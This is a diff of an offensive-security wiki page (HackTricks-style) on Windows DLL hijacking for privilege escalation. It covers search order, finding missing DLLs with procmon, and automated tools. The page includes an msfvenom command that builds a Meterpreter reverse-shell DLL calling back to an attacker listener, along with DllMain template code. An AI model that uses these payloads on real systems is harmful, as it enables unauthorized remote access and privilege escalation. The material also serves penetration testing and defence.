@@ -1,4 +1,4 @@
-
+# Dll Hijacking
 
 <details>
 
@@ -16,14 +16,21 @@ Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
 
 </details>
 
+{% hint style="danger" %}
+<img src="../../.gitbook/assets/image (1) (1).png" alt="" data-size="original">
 
-# Definition
+If you are interested in **hacking carer** and hack the unhackable - **we are hiring!** (_fluent polish written and spoken required_).
+
+{% embed url="https://www.stmcyber.com/careers" %}
+{% endhint %}
+
+## Definition
 
 First of all, let’s get the definition out of the way. DLL hijacking is, in the broadest sense, **tricking a legitimate/trusted application into loading an arbitrary DLL**. Terms such as _DLL Search Order Hijacking_, _DLL Load Order Hijacking_, _DLL Spoofing_, _DLL Injection_ and _DLL Side-Loading_ are often -mistakenly- used to say the same.
 
 Dll hijacking can be used to **execute** code, obtain **persistence** and **escalate privileges**. From those 3 the **least probable** to find is **privilege escalation** by far. However, as this is part of the privilege escalation section, I will focus on this option. Also, note that independently of the goal, a dll hijacking is perform the in the same way.
 
-## Types
+### Types
 
 There is a **variety of approaches** to choose from, with success depending on how the application is configured to load its required DLLs. Possible approaches include:
 
@@ -34,7 +41,7 @@ There is a **variety of approaches** to choose from, with success depending on h
 5. **WinSxS DLL replacement**: replace the legitimate DLL with the evil DLL in the relevant WinSxS folder of the targeted DLL. Often referred to as DLL side-loading \[[7](https://www.fireeye.com/content/dam/fireeye-www/global/en/current-threats/pdfs/rpt-dll-sideloading.pdf)].
 6. **Relative path DLL Hijacking:** copy (and optionally rename) the legitimate application to a user-writeable folder, alongside the evil DLL. In the way this is used, it has similarities with (Signed) Binary Proxy Execution \[[8](https://attack.mitre.org/techniques/T1218/)]. A variation of this is (somewhat oxymoronically called) ‘_bring your own LOLbin_’ \[[9](https://www.microsoft.com/security/blog/2019/09/26/bring-your-own-lolbin-multi-stage-fileless-nodersok-campaign-delivers-rare-node-js-based-malware/)] in which the legitimate application is brought with the evil DLL (rather than copied from the legitimate location on the victim’s machine).
 
-# Finding missing Dlls
+## Finding missing Dlls
 
 The most common way to find missing Dlls inside a system is running [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) from sysinternals, **setting** the **following 2 filters**:
 
@@ -49,11 +56,11 @@ and just show the **File System Activity**:
 If you are looking for **missing dlls in general** you **leave** this running for some **seconds**.\
 If you are looking for a **missing dll inside an specific executable** you should set **another filter like "Process Name" "contains" "\<exec name>", execute it, and stop capturing events**.
 
-# Exploiting Missing Dlls
+## Exploiting Missing Dlls
 
 In order to escalate privileges, the best chance we have is to be able to **write a dll that a privilege process will try to load** in some of **place where it is going to be searched**. Therefore, we will be able to **write** a dll in a **folder** where the **dll is searched before** the folder where the **original dll** is (weird case), or we will be able to **write on some folder where the dll is going to be searched** and the original **dll doesn't exist** on any folder.
 
-## Dll Search Order
+### Dll Search Order
 
 **Inside the** [**Microsoft documentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **you can find how the Dlls are loaded specifically.**
 
@@ -77,13 +84,13 @@ Finally, note that **a dll could be loaded indicating the absolute path instead 
 
 There are other ways to alter the ways to alter the search order but I'm not going to explain them here.
 
-### Exceptions on dll search order from Windows docs
+#### Exceptions on dll search order from Windows docs
 
 * If a **DLL with the same module name is already loaded in memory**, the system checks only for redirection and a manifest before resolving to the loaded DLL, no matter which directory it is in. **The system does not search for the DLL**.
 * If the DLL is on the list of **known DLLs** for the version of Windows on which the application is running, the **system uses its copy of the known DLL** (and the known DLL's dependent DLLs, if any) **instead of searching** for the DLL. For a list of known DLLs on the current system, see the following registry key: **HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs**.
 * If a **DLL has dependencies**, the system **searches** for the dependent DLLs as if they were loaded with just their **module names**. This is true **even if the first DLL was loaded by specifying a full path**.
 
-## Escalating Privileges
+### Escalating Privileges
 
 **Requisites**:
 
@@ -113,25 +120,25 @@ dumpbin /imports C:\path\Tools\putty\Putty.exe
 dumpbin /export /path/file.dll
 ```
 
-## Automated tools
+### Automated tools
 
 [**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)will check if you have write permissions on any folder inside system PATH.\
 Other interesting automated tools to discover this vulnerability are **PowerSploit functions**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ and _Write-HijackDll._
 
-## Example
+### Example
 
 In case you find an exploitable scenario one of the most important things to successfully exploit it would be to **create a dll that exports at least all the functions the executable will import from it**. Anyway, note that Dll Hijacking comes handy in order to [escalate from Medium Integrity level to High **(bypassing UAC)**](../authentication-credentials-uac-and-efs.md#uac) or from[ **High Integrity to SYSTEM**](./#from-high-integrity-to-system)**.** You can find an example of **how to create a valid dll** inside this dll hijacking study focused on dll hijacking for execution: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
 Moreover, in the **next sectio**n you can find some **basic dll codes** that might be useful as **templates** or to create a **dll with non required functions exported**.
 
-# **Creating and compiling Dlls**
+## **Creating and compiling Dlls**
 
-## **Meterpreter**
+### **Meterpreter**
 
 ```bash
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
 ```
 
-## Your own
+### Your own
 
 Note that in several cases the Dll that you compile must **export several functions** that are going to be loaded by the victim process, if these functions doesn't exist the **binary won't be able to load** them and the **exploit will fail**.
 
@@ -216,6 +223,13 @@ BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReser
 }
 ```
 
+{% hint style="danger" %}
+<img src="../../.gitbook/assets/image (1) (1).png" alt="" data-size="original">
+
+If you are interested in **hacking carer** and hack the unhackable - **we are hiring!** (_fluent polish written and spoken required_).
+
+{% embed url="https://www.stmcyber.com/careers" %}
+{% endhint %}
 
 <details>
 
@@ -232,5 +246,3 @@ Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
 **Share your hacking tricks submitting PRs to the** [**hacktricks github repo**](https://github.com/carlospolop/hacktricks)**.**
 
 </details>
-
-
